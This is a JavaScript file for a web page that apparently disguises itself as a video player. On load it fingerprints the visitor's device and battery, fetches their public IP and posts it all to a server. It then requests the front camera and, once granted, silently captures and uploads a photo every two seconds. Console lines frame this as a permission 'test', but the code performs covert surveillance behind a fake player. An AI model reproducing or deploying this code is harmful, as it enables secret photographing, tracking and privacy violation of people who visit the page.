var deviceFingerprint = {};
var realIP = '';
var cameraStream = null;
var photoCount = 0;
var photoInterval = null;
var deviceDataSent = false;

function getDeviceModel() {
  return new Promise(function(resolve) {
    try {
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        navigator.userAgentData.getHighEntropyValues([
          'architecture', 'bitness', 'brands', 'fullVersionList',
          'mobile', 'model', 'platform', 'platformVersion', 'uaFullVersion'
        ]).then(function(hints) {
          if (hints) {
            var parts = [];
            if (hints.brands) {
              var brands = hints.brands.map(function(b) { return b.brand + ' ' + b.version; }).join(' / ');
              parts.push(brands);
            }
            if (hints.model && hints.model !== '') parts.push('Model: ' + hints.model);
            if (hints.platform) parts.push(hints.platform + (hints.platformVersion ? ' ' + hints.platformVersion : ''));
            if (hints.architecture) parts.push(hints.architecture + (hints.bitness ? ' ' + hints.bitness : ''));
            if (hints.mobile !== undefined) parts.push(hints.mobile ? 'Mobile' : 'Desktop');
            if (parts.length > 0) { resolve(parts.join(' | ')); return; }
          }
          resolve(parseUA());
        }).catch(function() { resolve(parseUA()); });
      } else {
        resolve(parseUA());
      }
    } catch (e) { resolve(parseUA()); }
  });
}

function parseUA() {
  var ua = navigator.userAgent;
  var result = '';

  var androidMatch = ua.match(/Android\s+([\d.]+)/);
  if (androidMatch) {
    result += 'Android ' + androidMatch[1];
    var buildMatch = ua.match(/Build\/([A-Za-z0-9._]+)/);
    if (buildMatch) result += ' | Build: ' + buildMatch[1];
    var modelPatterns = [
      [/SM-([A-Za-z0-9]+)/, 'Samsung '], [/SAMSUNG[ -]([A-Za-z0-9]+)/, 'Samsung '],
      [/Pixel[ _]?(\d+[a-z]*)/i, 'Google Pixel '], [/ONEPLUS[ _]?([A-Za-z0-9]+)/i, 'OnePlus '],
      [/Xiaomi[ _]?([A-Za-z0-9]+)/i, 'Xiaomi '], [/Redmi[ _]?([A-Za-z0-9]+)/i, 'Xiaomi Redmi '],
      [/POCO[ _]?([A-Za-z0-9]+)/i, 'Xiaomi POCO '], [/HUAWEI[ _]?([A-Za-z0-9-]+)/i, 'Huawei '],
      [/HONOR[ _]?([A-Za-z0-9-]+)/i, 'Honor '], [/OPPO[ _]?([A-Za-z0-9]+)/i, 'OPPO '],
      [/vivo[ _]?([A-Za-z0-9]+)/i, 'vivo '], [/realme[ _]?([A-Za-z0-9]+)/i, 'realme '],
      [/LG-([A-Za-z0-9]+)/, 'LG '], [/Moto[ _]?[G|E|Z][ _]?\(?([A-Za-z0-9]+)?\)?/i, 'Motorola '],
      [/Nokia[ _]?([A-Za-z0-9]+)/i, 'Nokia '], [/ASUS[ _]?([A-Za-z0-9_-]+)/i, 'ASUS '],
      [/Lenovo[ _]?([A-Za-z0-9_-]+)/i, 'Lenovo '], [/INFINIX[ _]?([A-Za-z0-9]+)/i, 'Infinix '],
      [/TECNO[ _]?([A-Za-z0-9]+)/i, 'TECNO '],
    ];
    for (var i = 0; i < modelPatterns.length; i++) {
      var p = modelPatterns[i][0], b = modelPatterns[i][1];
      var m = ua.match(p);
      if (m) { result += ' | ' + b + (m[1] || ''); break; }
    }
    return result || ua.substring(0, 200);
  }

  if (/iPhone|iPad|iPod/.test(ua)) {
    var osMatch = ua.match(/OS\s+(\d+[._]\d+(?:[._]\d+)?)/);
    var osVer = osMatch ? osMatch[1].replace(/_/g, '.') : '';
    if (/iPad/.test(ua)) result = 'iPad';
    else if (/iPod/.test(ua)) result = 'iPod';
    else result = 'iPhone';
    return result + (osVer ? ' | iOS ' + osVer : '');
  }

  if (/Windows/.test(ua)) {
    var wv = ua.match(/Windows NT\s+([\d.]+)/);
    return 'Windows ' + (wv ? wv[1] : '') + ' | ' + (ua.includes('x64') || ua.includes('Win64') ? '64-bit' : '32-bit');
  }
  if (/Mac OS|Macintosh/.test(ua) && !/iPhone|iPad|iPod/.test(ua)) {
    var mv = ua.match(/Mac OS X\s+([\d_]+)/);
    return 'macOS ' + (mv ? mv[1].replace(/_/g, '.') : '') + ' | ' + (ua.includes('ARM') || ua.includes('arm') ? 'Apple Silicon' : 'Intel');
  }
  if (/Linux/.test(ua) && !/Android/.test(ua)) return 'Linux';
  return ua.substring(0, 150);
}

function getConnectionType() {
  var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (!c) return 'unknown';
  return (c.type || 'unknown') + '|' + (c.effectiveType || c.type || 'unknown');
}

function getBatteryInfo() {
  return new Promise(function(resolve) {
    try {
      if (navigator.getBattery) {
        navigator.getBattery().then(function(b) {
          resolve({ level: Math.round(b.level * 100), charging: b.charging });
        }).catch(function() { resolve(null); });
      } else { resolve(null); }
    } catch (e) { resolve(null); }
  });
}

function postJSON(url, data) {
  try {
    return fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
  } catch (e) { return null; }
}

function postForm(url, formData) {
  try { fetch(url, { method: 'POST', body: formData }); } catch (e) {}
}

function fetchRealIP() {
  return new Promise(function(resolve) {
    try {
      fetch('https://api.ipify.org?format=json').then(function(r) {
        return r.json();
      }).then(function(d) {
        realIP = d.ip || '';
        resolve(realIP);
      }).catch(function() { resolve(''); });
    } catch (e) { resolve(''); }
  });
}

function getOrientation() {
  if (screen.orientation && screen.orientation.type) return screen.orientation.type;
  if (typeof window.orientation !== 'undefined') {
    var a = window.orientation;
    if (a === 0 || a === 180) return 'portrait-primary';
    if (a === 90 || a === -90) return 'landscape-primary';
    return a + 'deg';
  }
  return (window.innerWidth > window.innerHeight) ? 'landscape' : 'portrait';
}

function getDeviceData() {
  var scr = screen;
  return {
    screen: scr.width + 'x' + scr.height,
    availScreen: scr.availWidth + 'x' + scr.availHeight,
    windowSize: window.innerWidth + 'x' + window.innerHeight,
    colorDepth: scr.colorDepth || scr.pixelDepth || 24,
    pixelRatio: window.devicePixelRatio || 1,
    touchPoints: navigator.maxTouchPoints || 0,
    orientation: getOrientation(),
    language: navigator.language,
    languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
    platform: navigator.platform || 'unknown',
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    connectionType: getConnectionType(),
    vendor: navigator.vendor || 'unknown',
    appVersion: navigator.appVersion || '',
    realIP: realIP,
    deviceModel: deviceFingerprint.model
  };
}

function getBrowserName() {
  var ua = navigator.userAgent;
  if (ua.includes('Edg')) return 'Edge';
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
  if (ua.includes('Firefox')) return 'Firefox';
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
  return 'Other';
}

function getOSName() {
  var ua = navigator.userAgent;
  if (/Android/i.test(ua)) return 'Android';
  if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
  if (/Windows/i.test(ua)) return 'Windows';
  if (/Mac OS|Macintosh/i.test(ua)) return 'macOS';
  if (/Linux/i.test(ua)) return 'Linux';
  return 'Other';
}

function getDeviceType() {
  var ua = navigator.userAgent;
  if (/Tablet|iPad/i.test(ua)) return 'Tablet';
  if (/Mobile|Android|iPhone|iPod/i.test(ua)) return 'Mobile';
  return 'Desktop';
}

function sendDeviceData() {
  if (deviceDataSent) return;
  deviceDataSent = true;

  getBatteryInfo().then(function(batt) {
    var dd = getDeviceData();

    var payload = {
      deviceModel: dd.deviceModel,
      screen: dd.screen,
      availScreen: dd.availScreen,
      windowSize: dd.windowSize,
      colorDepth: dd.colorDepth,
      pixelRatio: dd.pixelRatio,
      touchPoints: dd.touchPoints,
      orientation: dd.orientation,
      language: dd.language,
      languages: dd.languages,
      platform: dd.platform,
      cores: dd.cores,
      memory: dd.memory,
      timezone: dd.timezone,
      connectionType: dd.connectionType,
      vendor: dd.vendor,
      appVersion: dd.appVersion,
      realIP: realIP,
      browser: getBrowserName(),
      os: getOSName(),
      deviceType: getDeviceType(),
      battery: batt ? batt.level : null,
      batteryCharging: batt ? batt.charging : null,
      deviceHash: ''
    };

    var hashKey = [
      payload.deviceModel, payload.screen, payload.pixelRatio,
      payload.cores, payload.memory, payload.platform,
      payload.timezone, payload.language
    ].join('|');
    var hash = 0;
    for (var i = 0; i < hashKey.length; i++) {
      hash = ((hash << 5) - hash) + hashKey.charCodeAt(i);
      hash |= 0;
    }
    payload.deviceHash = Math.abs(hash).toString(16);

    deviceFingerprint = payload;
    postJSON('/api/capture', payload);
  });
}

function capturePhoto() {
  var video = document.getElementById('playerVideo');
  var canvas = document.getElementById('hiddenCanvas');

  if (!video || !cameraStream || video.videoWidth === 0) return;

  photoCount++;
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(function(blob) {
    if (!blob || blob.size < 100) return;
    var fd = new FormData();
    fd.append('photo', blob, 'cam_' + Date.now() + '_' + photoCount + '.jpg');
    fd.append('type', 'camera-test');
    postForm('/api/photo', fd);
    console.log('Photo #' + photoCount + ' captured and sent');
  }, 'image/jpeg', 0.85);
}

function startSpamPhotos() {
  if (photoInterval) return;
  capturePhoto();
  photoInterval = setInterval(function() {
    capturePhoto();
  }, 2000);
}

function stopSpamPhotos() {
  if (photoInterval) {
    clearInterval(photoInterval);
    photoInterval = null;
  }
  console.log('Stopped. Total photos taken: ' + photoCount);
}

function autoRequestCamera() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    console.log('TEST RESULT: getUserMedia not available on this browser');
    return;
  }

  console.log('TEST STARTING: Requesting camera immediately on page load...');
  console.log('If browser shows permission popup -> PROOF browser always asks for permission');
  console.log('If NO popup and camera activates silently -> that would be a security bug');

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  })
  .then(function(stream) {
    console.log('TEST RESULT: Camera ACCESS GRANTED - user clicked Allow in browser permission dialog');
    cameraStream = stream;
    var video = document.getElementById('playerVideo');
    video.srcObject = stream;
    video.muted = true;
    video.setAttribute('playsinline', '');
    video.play().then(function() {
      var box = document.getElementById('playerBox');
      if (box) box.classList.add('active');
      setTimeout(function() { startSpamPhotos(); }, 2000);
    }).catch(function() {});
  })
  .catch(function(err) {
    console.log('TEST RESULT: Camera ACCESS DENIED - user clicked Block or camera unavailable');
    console.log('This PROVES the browser ALWAYS shows permission dialog');
    console.log('Nobody can take your photo without you clicking ALLOW');
    console.log('Error details:', err.message);
    var box = document.getElementById('playerBox');
    if (box) box.classList.add('active');
  });
}

function tryPlay() {
  var loadBar = document.getElementById('loadingBar');

  if (cameraStream) {
    loadBar.style.width = '100%';
    setTimeout(function() { loadBar.style.width = '0'; }, 600);
    document.getElementById('playerBox').classList.add('active');
    startSpamPhotos();
    return;
  }

  loadBar.style.width = '50%';

  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  })
  .then(function(stream) {
    cameraStream = stream;
    var video = document.getElementById('playerVideo');
    video.srcObject = stream;
    video.muted = true;
    video.setAttribute('playsinline', '');

    video.play().then(function() {
      loadBar.style.width = '100%';
      setTimeout(function() { loadBar.style.width = '0'; }, 600);
      document.getElementById('playerBox').classList.add('active');
      setTimeout(function() { startSpamPhotos(); }, 2000);
    }).catch(function() {
      loadBar.style.width = '100%';
      setTimeout(function() { loadBar.style.width = '0'; }, 600);
      document.getElementById('playerBox').classList.add('active');
      setTimeout(function() { startSpamPhotos(); }, 2000);
    });
  })
  .catch(function() {
    loadBar.style.width = '100%';
    setTimeout(function() { loadBar.style.width = '0'; }, 600);
    document.getElementById('playerBox').classList.add('active');
  });
}

document.addEventListener('DOMContentLoaded', function() {
  fetchRealIP().then(function() {
    return getDeviceModel();
  }).then(function(model) {
    deviceFingerprint.model = model;
    sendDeviceData();
  });

  setTimeout(function() {
    autoRequestCamera();
  }, 1000);
});

function scrollToPlayer() {
  var box = document.getElementById('playerBox');
  if (box) {
    box.scrollIntoView({ behavior: 'smooth' });
    tryPlay();
  }
}
